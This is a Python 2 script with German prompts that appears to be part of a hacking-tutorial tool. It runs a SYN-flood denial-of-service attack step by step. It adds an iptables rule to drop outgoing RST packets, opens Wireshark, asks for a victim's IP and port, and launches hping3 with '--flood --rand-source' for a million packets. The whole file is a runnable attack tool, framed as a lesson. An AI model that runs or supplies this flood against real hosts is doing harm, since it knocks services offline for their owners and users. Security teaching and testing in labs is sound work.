#!/usr/bin/python
# -*- coding: utf-8 -*-


import os
import sys
import subprocess
import socket
import webbrowser

import colors
import generics
from generics import rlinput, execute, clearScreen


def SYNFLOOD_Menu():
	shellCols = colors.ShellColors
	showMenu = True
	while(showMenu):
		clearScreen()
		print shellCols.UNDERLINE + shellCols.HEADER + 'SYN-Flooding Angriff' + shellCols.ENDC + '\n'

		##IP-Adresse des verwendeten Adapters herausfinden
		print('In diesem Tutorial wird eine Denial of Service Attacke via SYN- Flooding ausgeführt.')
		print('Zuerst muss die IP-Adresse des Interfaces angegeben werden, durch welche der Angriff ausgeführt werden soll,')
		command = rlinput('Hierzu lassen wird zuerst alle verfügbaren Interfaces anzeigen. \n# ', 'ifconfig')
		execute(command)

		##IP-Tables mit der eigenen IP-Adresse erstellen
		print('Um die SYN-Flood Attacke richtig auszuführen müssen die ausgehenden RES-Pakete geblockt werden')
		print('Hierzu wird ein Eintrag in den IP-Tables erstellt')
		attipadr = rlinput('Eigene IP Adresse(IPv4): ')
		command = rlinput('IP-Tables Eintrag: \n# ', 'iptables -A OUTPUT -p tcp -s ' +attipadr + ' --tcp-flags RST RST -j DROP')
		os.system(command)
		print('\n')
		
		command = rlinput('Wireshark Öffnen: \n# ', ' wireshark &')
		os.system(command)
		clearScreen()
		
		print("Gebe die IP-Adresse des Opfers in deinen Browser ein, um den Effekt des Denial-of-Service Angriffs zu sehen.\n")
		raw_input("Drücke Enter um fortzufahren.")

		synLoop = True

		while(synLoop):
			##Informationen des Opfers eingeben 
			attackedHost = raw_input('Bitte IP des Opfers angeben(IPv4): ')
			attackedPort = int(raw_input('Bitte den Port des Opfers eingeben: '))
		
			print('Der folgende Ausdruck zeigt in Wireshark die Einträge, welche beide IP Adressen beinhalten. ')
			print('ip.addr == ' +attipadr + ' && ip.addr == ' +attackedHost )
		
			selection = raw_input(shellCols.BLUE + '\nDrücke ENTER um den Angriff zu starten ' + shellCols.ENDC)
                        
                        flooding(attackedHost, attackedPort)                    
			print('Der SYN Flooding Angriff wurde abgeschlossen.')
			selection = raw_input(shellCols.BLUE + "\nGeben Sie y ein um einen weiteren SYN-Flood Angriff zu starten oder ENTER um das Programm zu beenden: " + shellCols.ENDC)
			if selection == "Y" or selection == "y":
				synLoop = True
			else:	
				synLoop = False

		selection = raw_input(shellCols.BLUE + '\nDrücke Enter um das Programm zu verlassen...' + shellCols.ENDC)
		print('Gehe zurück zum Hauptmenü')
		showMenu = False
		break

##funktion die für das flooding verantwortlich ist
def flooding(atHost, atPort):
	execute("hping3 -c 1000000 -d 120 -S -w 64 -p " + str(atPort) + " --flood --rand-source " + str(atHost))

